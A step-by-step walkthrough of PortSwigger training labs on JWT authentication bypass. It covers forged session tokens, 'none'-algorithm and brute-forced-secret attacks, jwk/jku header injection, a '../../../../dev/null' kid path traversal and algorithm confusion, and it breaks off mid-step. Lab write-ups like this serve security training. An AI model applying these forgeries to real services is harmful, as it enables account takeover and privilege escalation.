# Portswigger
## JWT Attacks
### JWT authentication bypass via unverified signature
```bash

# This lab uses a JWT-based mechanism for handling sessions. Due to implementation flaws, the server doesn't verify the signature of any JWTs that it receives.

# To solve the lab, modify your session token to gain access to the admin panel at /admin, then delete the user carlos.

# You can log in to your own account using the following credentials: wiener:peter 

Go to: Extender -> BApp Store -> Search 'JWT Editor'
Install JWT Editor
Login as wiener:peter
Go to: HTTP history
Find:

GET /my-account HTTP/1.1

Send to repeater
Go to: Request -> JSON Web Token -> Payload

Change:

"sub": "wiener",

To

"sub": "administrator",

Go to: Request -> JSON Web Token -> Serialized JWT -> Copy
Go to: Request -> Raw
Change:

Cookie: session=eyJraWQiOiI0ZTUzMzQ4Yi03MjRmLTRjMDctYTk5Mi0zODNkYmY4Mjg1MDMiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY1NTE4MzU5MX0.piVhnBRVZXll3v34Ce3w0-0tRziNNzwILWPwUiVF6LRXBplTvwu4dur7mdBTgvaiibEeeTaOnQmAnqOaCJwWyzi-4zCYprUCzWaiEhZPSuF0fCXB7LXtUzckFDlcLwAS6k0bD3p2VPbp4oXqQIZjq_WaQwYpDKMsvppsvtY6Pd4a8J1n9hnW6I67j1u7lpMO4HNIjO2NbioDJJdk5Od7GsVAcYjJqaf8PHSGTuXeBzTtZGJ84td790RsOIi8GerncRpVolDyO5PZbhjTdklqwLB_IqqFO3hetwkZI5prhZbDkJ444oUynlIbNiwSAKej4CViIdjl-TVefi7oTABxKg

To

Cookie: session=eyJraWQiOiI0ZTUzMzQ4Yi03MjRmLTRjMDctYTk5Mi0zODNkYmY4Mjg1MDMiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2NTUxODM1OTF9.piVhnBRVZXll3v34Ce3w0-0tRziNNzwILWPwUiVF6LRXBplTvwu4dur7mdBTgvaiibEeeTaOnQmAnqOaCJwWyzi-4zCYprUCzWaiEhZPSuF0fCXB7LXtUzckFDlcLwAS6k0bD3p2VPbp4oXqQIZjq_WaQwYpDKMsvppsvtY6Pd4a8J1n9hnW6I67j1u7lpMO4HNIjO2NbioDJJdk5Od7GsVAcYjJqaf8PHSGTuXeBzTtZGJ84td790RsOIi8GerncRpVolDyO5PZbhjTdklqwLB_IqqFO3hetwkZI5prhZbDkJ444oUynlIbNiwSAKej4CViIdjl-TVefi7oTABxKg

Response:

HTTP/1.1 200 OK

<a href="/admin">Admin panel

Change:

GET /my-account HTTP/1.1

To

GET /admin HTTP/1.1

Response:

HTTP/1.1 200 OK

<a href="/admin/delete?username=carlos">Delete

Change:

GET /admin HTTP/1.1

To

GET /admin/delete?username=carlos HTTP/1.1

Response:

HTTP/1.1 302 Found

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220613231853.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220613231916.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220613232059.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220613232148.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220613232219.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220613232242.png)

### JWT authentication bypass via flawed signature verification
```bash

# This lab uses a JWT-based mechanism for handling sessions. The server is insecurely configured to accept unsigned JWTs.

# To solve the lab, modify your session token to gain access to the admin panel at /admin, then delete the user carlos.

# You can log in to your own account using the following credentials: wiener:peter 

Login as wiener:peter
Go to: HTTP history
Find:

GET /my-account HTTP/1.1

Send to repeater
Go to: Request -> JSON Web Token -> Payload

Change:

"sub": "wiener",

To

"sub": "administrator",

Go to: Request -> JSON Web Token -> Attack -> "none" Signing Algorithm
Go to: Request -> JSON Web Token -> Serialized JWT -> Copy
Go to: Request -> Raw
Change:

Cookie: session=eyJraWQiOiJkZmU3NWFjNC01M2RlLTQxMTctOTQxOC1kMDQwMjlhYTc0YzIiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2NTUxODQ3NTR9.n2IMC7VhVcjtizf-gsxkAMj21GlGjczI80CaI77wPB8swv5T7H8VX1kDgJR5-I0Cn6tqvyQkl77RB7DLm0q_Pv-1eUam5UiWyJzYqE2wsk_T7dr3zn6RLhySFg9elYTHYUWNt-AlJ6QVRM1_2f1tITqVP4LnEvFfssVdYbDc7Tbu0gtXKwVzVBorZY-_TYiGiMDqqZKUSLFtSsqHA0arY7LMLjepfhjQePMSkcCJa98zznZ6yo4T5HVSZhAnbf6VsBziFtbpfTreF8dDUJlaaZILhxfH4whbZcj3tsERLLAZFQvXNf5Ak3LqJuaRnRngvnYw5y4FKMUIxCGINahX_g

To

Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2NTUxODQ3NTR9.

Response:

HTTP/1.1 200 OK

<a href="/admin">Admin panel

Change:

GET /my-account HTTP/1.1

To

GET /admin HTTP/1.1

Response:

HTTP/1.1 200 OK

<a href="/admin/delete?username=carlos">Delete

Change:

GET /admin HTTP/1.1

To

GET /admin/delete?username=carlos HTTP/1.1

Response:

HTTP/1.1 302 Found

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220613231853.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220613234107.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220613234405.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220613234436.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220613234518.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220613234603.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220613234623.png)

### JWT authentication bypass via weak signing key
```bash

# This lab uses a JWT-based mechanism for handling sessions. It uses an extremely weak secret key to both sign and verify tokens. This can be easily brute-forced using a wordlist of common secrets.

# To solve the lab, first brute-force the website's secret key. Once you've obtained this, use it to sign a modified session token that gives you access to the admin panel at /admin, then delete the user carlos.

# You can log in to your own account using the following credentials: wiener:peter 

Login as wiener:peter
Go to: HTTP history
Find:

GET /my-account HTTP/1.1

Cookie: session=
eyJraWQiOiJhYjBlOTNjOC1mYzI5LTRjNzctODllMy1jNjhkYjE2MDRiNzQiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY1NTE4NjMxMX0.7UFgO4ATXFd2oiVNJhnlntRwroLN0ZpgnPMhycgEF9Q

Copy:

eyJraWQiOiJhYjBlOTNjOC1mYzI5LTRjNzctODllMy1jNjhkYjE2MDRiNzQiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY1NTE4NjMxMX0.7UFgO4ATXFd2oiVNJhnlntRwroLN0ZpgnPMhycgEF9Q

Send to repeater

Open your preferred terminal emulator

mkdir -p ~/Portswigger/JWT_Attacks && cd ~/Portswigger/JWT_Attacks && wget https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list && hashcat -a 0 -m 16500 eyJraWQiOiJhYjBlOTNjOC1mYzI5LTRjNzctODllMy1jNjhkYjE2MDRiNzQiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY1NTE4NjMxMX0.7UFgO4ATXFd2oiVNJhnlntRwroLN0ZpgnPMhycgEF9Q jwt.secrets.list

Response:

eyJraWQiOiJhYjBlOTNjOC1mYzI5LTRjNzctODllMy1jNjhkYjE2MDRiNzQiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY1NTE4NjMxMX0.7UFgO4ATXFd2oiVNJhnlntRwroLN0ZpgnPMhycgEF9Q:secret1

Go to: Request -> JSON Web Token -> Payload

Change:

"sub": "wiener",

To

"sub": "administrator",

Go to: Request -> JSON Web Token -> Serialized JWT -> Copy

Go to:

https://jwt.io/

Go to: Encoded
Paste your copied cookie
Go to: Decoded -> VERIFY SIGNATURE
Change:

your-256-bit-secret

To

secret1

Go to: Encoded
Copy:

eyJraWQiOiJhYjBlOTNjOC1mYzI5LTRjNzctODllMy1jNjhkYjE2MDRiNzQiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2NTUxODYzMTF9.Zc5405xmpiAfT6IdNqWMd7HE59Z11WiSKzPWdHnyW6c

Go to: Repeater -> Request -> Raw
Change:

Cookie: session=eyJraWQiOiJhYjBlOTNjOC1mYzI5LTRjNzctODllMy1jNjhkYjE2MDRiNzQiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY1NTE4NjMxMX0.7UFgO4ATXFd2oiVNJhnlntRwroLN0ZpgnPMhycgEF9Q

To

eyJraWQiOiJhYjBlOTNjOC1mYzI5LTRjNzctODllMy1jNjhkYjE2MDRiNzQiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2NTUxODYzMTF9.Zc5405xmpiAfT6IdNqWMd7HE59Z11WiSKzPWdHnyW6c

Response:

HTTP/1.1 200 OK

<a href="/admin">Admin panel

Change:

GET /my-account HTTP/1.1

To

GET /admin HTTP/1.1

Response:

HTTP/1.1 200 OK

<a href="/admin/delete?username=carlos">Delete

Change:

GET /admin HTTP/1.1

To

GET /admin/delete?username=carlos HTTP/1.1

Response:

HTTP/1.1 302 Found

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220613231853.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220614002111.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220614001818.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220614003347.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220614000426.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220614000337.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220614002313.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220614002806.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220614002702.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220614002947.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220614003031.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220614003054.png)

### JWT authentication bypass via jwk header injection
```bash

# This lab uses a JWT-based mechanism for handling sessions. The server supports the jwk parameter in the JWT header. This is sometimes used to embed the correct verification key directly in the token. However, it fails to check whether the provided key came from a trusted source.

# To solve the lab, modify and sign a JWT that gives you access to the admin panel at /admin, then delete the user carlos.

# You can log in to your own account using the following credentials: wiener:peter 

Login as wiener:peter
Go to: HTTP history
Find:

GET /my-account HTTP/1.1

Send to repeater

Go to: JWT Editor Keys -> New RSA Key -> Generate -> OK
Go to: Repeater -> Request -> JSON Web Token -> Payload
Change:

"sub": "wiener",

To

"sub": "administrator",

Go to: Repeater -> Request -> JSON Web Token -> Attack -> Embedded JWK -> OK
Go to: Request -> JSON Web Token -> Serialized JWT -> Copy
Go to: Repeater -> Request -> Raw
Change:

Cookie: session=eyJraWQiOiJjZGUwYmRjMy02ZGU4LTQyYzMtOWUzYy1jNmI1OGJhOTBlMTgiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY1NTE4OTczOH0.nT-lrBboh0SO_hyW8Sg3w65HM-fcpQcp2UUobwQYo9OsgMzfUaIsjDvJgxsZhWkkMRKirdKfSzBiE9c8DgCXMCoclbqW5Svm60HTxVLJj9rtOnfalzeCUx9IBC-6pECbVBShopznydTMzX5fdOzcIlO4Mac85N_t39XugaLDSMSLZ5NueV74AyZdLe0nJH_aCKQU1_whj8SGHr8qkm9JM49qBGBQE2InE865kilD_W6C9_OsTyW2YWBTOjnV58Iiw1FHkoaceJQnoooh_dX9QEwZ-gDru53uVhugwh8c3jkwy2us9dYOiCusROmrO1kltJBK7EUYkLQm0KiXPERjEg

To

Cookie: session=eyJraWQiOiI0MjMwZTU3Zi1jMjlmLTQ3NGItODE1MS1lYjEwNjdmMjE1MTQiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsImtpZCI6IjQyMzBlNTdmLWMyOWYtNDc0Yi04MTUxLWViMTA2N2YyMTUxNCIsIm4iOiJnNzJ2eWU2dDFTU1l5SUI2SDVCMEdjU1JkZVIyVlZhMkt3NUItSzR3VC0xWVpHbFRQY3N5NkV6RUlNTU5hQktzakQxcWF2b2ViWHkyVXVLVlhkM1pVak1zYUEtR0pudUZhdnk4Q3RHbGFNUVhlVjhoNXQ3OUNyYWtsVnRGdHoxaG04bjR0RWhuWFhRNlFWamprNlJkUmxWM3V4bW1ZV1ROcXloUGh4TFVEbm40NHpRZDlUZEc3T3QxcE5NdmZteWNSVExTVmhrak8tS0Yxd3FNUGVic2hXbkJZSmd0NUdGMldRQVh3Q0RjMHZHNEJaZkNvM21TcnBTbDhzTzRnUzB6ZjJ2bWRNVHJPWjliaU1BeldGWlNXeFM1T2hYYjR1S1V2X2RuQ21jdWVKUnVMYllPb2YwbnpzQzQwUDNjem56OXFDZHZuVVFJallNOWpDRTJWaVY4d3cifX0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2NTUxODk3Mzh9.PJa63bP0DZT3fvD6SLjuZXckPxjegNqzW76o11Vo7xTebTCmkeJ4bDUZi9tDVAIst1Uo_ak2AialBvREoqo1itZ827UNgar5ypty2R2zb23kyjWDapyT48IgOyDbu1zdv8M3e-21pvY8fm1u8Jcl0Qf5y781XjRyUBbRz0wm3ykDiYRCHDc16EFgvqFSMcqUtWi8qmbKbzI6rpwtSZpAE6H2RVBE9sYrOWWXnHn-93I-2tj_Q_iAI4R-dUz0eH7hWTGunv900fOqHdtdJqYIX7Ei_rJTp685g9ete4Z2J2BE_koOXIOMHIincMlbkidiFJd9Xg73SOtXWq9llILAYg

Response:

HTTP/1.1 200 OK

<a href="/admin">Admin panel

Change:

GET /my-account HTTP/1.1

To

GET /admin HTTP/1.1

Response:

HTTP/1.1 200 OK

<a href="/admin/delete?username=carlos">Delete

Change:

GET /admin HTTP/1.1

To

GET /admin/delete?username=carlos HTTP/1.1

Response:

HTTP/1.1 302 Found

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220613231853.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220614010035.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220614010355.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220614010638.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220614010702.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220614010748.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220614010913.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220614010951.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220614011014.png)

### JWT authentication bypass via jku header injection
```bash

# This lab uses a JWT-based mechanism for handling sessions. The server supports the jku parameter in the JWT header. However, it fails to check whether the provided URL belongs to a trusted domain before fetching the key.

# To solve the lab, forge a JWT that gives you access to the admin panel at /admin, then delete the user carlos.

# You can log in to your own account using the following credentials: wiener:peter 

Login as wiener:peter
Go to: HTTP history
Find:

GET /my-account HTTP/1.1

Send to repeater
Go to: "Go to exploit server"
Uncheck HTTPS (If following this example -- it is achievable with https)
File:

/.well-known/jwks.json

Store
Go to:
Go to: Repeater -> Request -> JSON Web Token -> 
Add:

"jku": "http://exploit-acbb1f131e71c0d1c0563c7f01ed003f.web-security-academy.net/.well-known/jwks.json"

Like so: (**DISCLAIMER** ensure the "kid" value comes from YOUR RSA key from "JWT Editor Keys")

{
    "kid": "4230e57f-c29f-474b-8151-eb1067f21514",
    "alg": "RS256",
    "jku": "http://exploit-acbb1f131e71c0d1c0563c7f01ed003f.web-security-academy.net/.well-known/jwks.json"
}


Go to: Repeater -> Request -> JSON Web Token -> Payload
Change:

"sub": "wiener",

To

"sub": "administrator",

Go to: Repeater -> Request -> JSON Web Token -> Sign -> Signing Key (RSA 2048) -> Heading Options (dont modify header) -> OK
Go to: JWT Editor Keys -> Double-click (RSA 2048)
Copy:

"kid": "4230e57f-c29f-474b-8151-eb1067f21514",
"n": "g72vye6t1SSYyIB6H5B0GcSRdeR2VVa2Kw5B-K4wT-1YZGlTPcsy6EzEIMMNaBKsjD1qavoebXy2UuKVXd3ZUjMsaA-GJnuFavy8CtGlaMQXeV8h5t79CraklVtFtz1hm8n4tEhnXXQ6QVjjk6RdRlV3uxmmYWTNqyhPhxLUDnn44zQd9TdG7Ot1pNMvfmycRTLSVhkjO-KF1wqMPebshWnBYJgt5GF2WQAXwCDc0vG4BZfCo3mSrpSl8sO4gS0zf2vmdMTrOZ9biMAzWFZSWxS5OhXb4uKUv_dnCmcueJRuLbYOof0nzsC40P3cznz9qCdvnUQIjYM9jCE2ViV8ww"

Go to: "Go to exploit server"
(The second key is irrelvant)
Body:

{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "4230e57f-c29f-474b-8151-eb1067f21514",
            "n": "g72vye6t1SSYyIB6H5B0GcSRdeR2VVa2Kw5B-K4wT-1YZGlTPcsy6EzEIMMNaBKsjD1qavoebXy2UuKVXd3ZUjMsaA-GJnuFavy8CtGlaMQXeV8h5t79CraklVtFtz1hm8n4tEhnXXQ6QVjjk6RdRlV3uxmmYWTNqyhPhxLUDnn44zQd9TdG7Ot1pNMvfmycRTLSVhkjO-KF1wqMPebshWnBYJgt5GF2WQAXwCDc0vG4BZfCo3mSrpSl8sO4gS0zf2vmdMTrOZ9biMAzWFZSWxS5OhXb4uKUv_dnCmcueJRuLbYOof0nzsC40P3cznz9qCdvnUQIjYM9jCE2ViV8ww"
        },
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA",
            "n": "fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw"
        }
    ]
}

Store
Go to: Request -> JSON Web Token -> Serialized JWT -> Copy
Go to: Repeater -> Request -> Raw
Change:

Cookie: session=eyJraWQiOiJjNTk3ZDE2ZC1lNTExLTQxNGUtYWM0My1hMTg0ZThlYjE1Y2IiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY1NTE5MzU4NX0.Dj31ctsx-RK_suargDGqSH_rqQIjnU8f17j9qBgLyXdf0dZtADANc2reXeBXp4gq6QdG4cXUB9jxtxeXOtQzrmUZkSGoPav0UdkgRb7s35hfvnS3B441VPvAzBw8yNHsWg_PFrj_hzKGbLZrRde8yJz1HtqcAj_GGJS-afFJEjmxsmOcyla3BUbO1ozFJYmTy0ZyQx8vHs496CsMxteaA63F4qN-y2pDyOibJUFofx9c23TB7oWUwh26RgGVBOE-Z60fhcbo_Hd5_WVvgaSwAJU2EntwtFt_VG_IFMM26R3SWrJ6ldG8lIKxS9Fg3ZB60ENE4K1o2WD4QEa-vXFqHg

To

Cookie: session=eyJraWQiOiI0MjMwZTU3Zi1jMjlmLTQ3NGItODE1MS1lYjEwNjdmMjE1MTQiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9leHBsb2l0LWFjYmIxZjEzMWU3MWMwZDFjMDU2M2M3ZjAxZWQwMDNmLndlYi1zZWN1cml0eS1hY2FkZW15Lm5ldC8ud2VsbC1rbm93bi9qd2tzLmpzb24ifQ.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2NTUxOTM1ODV9.Iytfo48gwysBACE0CiMPeaJj9WKIeSoAp5OHorzh42Mu6o1Gie1DIbjqdlRoEX7HUd52E2FkpmdsDyW607k7NARVX-wms-iKoqT-nOsyJdv4bWY-Es15W48geufl9JmpQS1FZkLarJVFEpEi3iHYfV_gW6S1Nx6yftkI2uaYZQN-C5Y3w66aN_9Bzp6oIDyCBBPHXeFdEJDEqVOVYE9fK5ybU7GxjUotGfxA62FsxLc-YHycKnBswoSsMl-jC1tqL0FOTw_SCIzFo_2aKwT5pTq4NbR0nQJPFmIymrhCTFcjB08HYOB1c7Z3bdcLjWO4niyeLvMY00qtHj4WgY4sTQ

Response:

HTTP/1.1 200 OK

<a href="/admin">Admin panel

Change:

GET /my-account HTTP/1.1

To

GET /admin HTTP/1.1

Response:

HTTP/1.1 200 OK

<a href="/admin/delete?username=carlos">Delete

Change:

GET /admin HTTP/1.1

To

GET /admin/delete?username=carlos HTTP/1.1

Response:

HTTP/1.1 302 Found

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220613231853.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220614023845.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220614030050.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220614024447.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220614025212.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220614025935.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220614023626.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220614030255.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220614030330.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220614030357.png)

### JWT authentication bypass via kid header path traversal
```bash

# This lab uses a JWT-based mechanism for handling sessions. In order to verify the signature, the server uses the kid parameter in JWT header to fetch the relevant key from its filesystem.

# To solve the lab, forge a JWT that gives you access to the admin panel at /admin, then delete the user carlos.

# You can log in to your own account using the following credentials: wiener:peter 

Login as wiener:peter
Go to: HTTP history
Find:

GET /my-account HTTP/1.1
Send to repeater

Go to: JWT Editor Keys -> New Symmetric Key -> Generate ->
Change:

"k": "PyNFF_oB3TfhYJjYPAQPUQ"

To

"k": "AA=="

-> OK
Go to: Repeater -> Request -> JSON Web Token -> Header
Change:

"kid": "6ccf7586-603c-48d2-aaf8-6413e3d7cd7a",

To

"kid": "../../../../dev/null",

Go to: Repeater -> Request -> JSON Web Token -> Payload
Change:

"sub": "wiener",

To

"sub": "administrator",

Go to: Repeater -> Request -> JSON Web Token -> Sign -> Signing key (newly created key) (dont modify header) -> OK
Change:

Cookie: session=eyJraWQiOiI2Y2NmNzU4Ni02MDNjLTQ4ZDItYWFmOC02NDEzZTNkN2NkN2EiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY1NTU0OTQyN30.jf5VGow3gTS0w6Tu-uhV0ti_NFXJV3ax4za2T5JIoyo

To

Cookie: session=eyJraWQiOiIuLi8uLi8uLi8uLi9kZXYvbnVsbCIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluc3RyYXRvciIsImV4cCI6MTY1NTU0OTQyN30.ynhBRLv_uS5P7nruiZYmuwZId-T8YNmdJkJHo39Sk6U

Response:

HTTP/1.1 200 OK

<a href="/admin">Admin panel

Change:

GET /my-account HTTP/1.1

To

GET /admin HTTP/1.1

Response:

HTTP/1.1 200 OK

<a href="/admin/delete?username=carlos">Delete

Change:

GET /admin HTTP/1.1

To

GET /admin/delete?username=carlos HTTP/1.1

Response:

HTTP/1.1 302 Found

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220613231853.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220618101522.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220618101821.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220618102114.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220618102255.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220618102326.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220618102347.png)

### JWT authentication bypass via algorithm confusion
```bash

# This lab uses a JWT-based mechanism for handling sessions. It uses a robust RSA key pair to sign and verify tokens. However, due to implementation flaws, this mechanism is vulnerable to algorithm confusion attacks.

# To solve the lab, first obtain the server's public key. This is exposed via a standard endpoint. Use this key to sign a modified session token that gives you access to the admin panel at /admin, then delete the user carlos.

# You can log in to your own account using the following credentials: wiener:peter 

Login as wiener:peter
Go to: HTTP history
Find:

GET /my-account HTTP/1.1
Send to repeater
Go to:

https://0ac2004203cc4281c0bd2a5a00bf00dc.web-security-academy.net/jwks.json

Find:

{"keys":[{"kty":"RSA","e":"AQAB","use":"sig","kid":"57eedb77-45e0-4545-8752-5546ea1d4aa7","alg":"RS256","n":"4QmN0048QH7NwfTX7AHpmd0nTHct-clNEAWjyKfdXMYp3Q0d6voo95rzbECl8Cblr3wI7FjBuIDNCvno8d_G4v_S-Pd06X2sjzXOCPbW1h7tmtVXzmpVcNzM5NobudALtNFgswSDLID-0JFzcx3c8Wntt4skRilfUQ5T6z-Yy2Qf0oSyBrxYav30BwV8R_2PDXzk0cZQkwP7HAvibn-v0ThLf98JLPAwEvkEkj7DwmIKThctyXUOmjO8H2t8ic5fqJoZU3u8qh1WJg6LSrtj1KDpbbkedFq3d39UkiFLxMJjGE3eyjlGpggtQd4k3yh7_oI3HqR6Bv6ScGUOij10GQ"}]}

Copy:

{"kty":"RSA","e":"AQAB","use":"sig","kid":"57eedb77-45e0-4545-8752-5546ea1d4aa7","alg":"RS256","n":"4QmN0048QH7NwfTX7AHpmd0nTHct-clNEAWjyKfdXMYp3Q0d6voo95rzbECl8Cblr3wI7FjBuIDNCvno8d_G4v_S-Pd06X2sjzXOCPbW1h7tmtVXzmpVcNzM5NobudALtNFgswSDLID-0JFzcx3c8Wntt4skRilfUQ5T6z-Yy2Qf0oSyBrxYav30BwV8R_2PDXzk0cZQkwP7HAvibn-v0ThLf98JLPAwEvkEkj7DwmIKThctyXUOmjO8H2t8ic5fqJoZU3u8qh1WJg6LSrtj1KDpbbkedFq3d39UkiFLxMJjGE3eyjlGpggtQd4k3yh7_oI3HqR6Bv6ScGUOij10GQ"}


Go to: JWT Editor Keys -> New RSA Key -> Key -> Paste -> OK
Double-click newly created key -> Key Format -> PEM -> key -> Copy Key
Go to: Decoder
Paste key in decoder -> Encode as Base64 -> Copy base64-encoded key
Go to: JWT Editor Keys -> New Symmetric Key -> Generate -> Key
Change:

"k": "UFDE3uQtqNz6zxkurI6q5g"

To

"k": "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUE0UW1OMDA0OFFIN053ZlRYN0FIcAptZDBuVEhjdCtjbE5FQVdqeUtmZFhNWXAzUTBkNnZvbzk1cnpiRUNsOENibHIzd0k3RmpCdUlETkN2bm84ZC9HCjR2L1MrUGQwNlgyc2p6WE9DUGJXMWg3dG10Vlh6bXBWY056TTVOb2J1ZEFMdE5GZ3N3U0RMSUQrMEpGemN4M2MKOFdudHQ0c2tSaWxmVVE1VDZ6K1l5MlFmMG9TeUJyeFlhdjMwQndWOFIvMlBEWHprMGNaUWt3UDdIQXZpYm4rdgowVGhMZjk4SkxQQXdFdmtFa2o3RHdtSUtUaGN0eVhVT21qTzhIMnQ4aWM1ZnFKb1pVM3U4cWgxV0pnNkxTcnRqCjFLRHBiYmtlZEZxM2QzOVVraUZMeE1KakdFM2V5amxHcGdndFFkNGszeWg3L29JM0hxUjZCdjZTY0dVT2lqMTAKR1FJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg=="

-> OK
Go to: Repeater -> Request -> JSON Web Token -> Header
Change:

"alg": "RS256"

To

"alg": "HS256"

Go to: Repeater -> Request -> JSON Web Token -> Payload
Change:

"sub": "wiener",

To

"sub": "administrator",

Go to: Repeater -> Request -> JSON Web Token -> Sign -> Signing key (newly created key) (dont modify header) -> OK
Change:

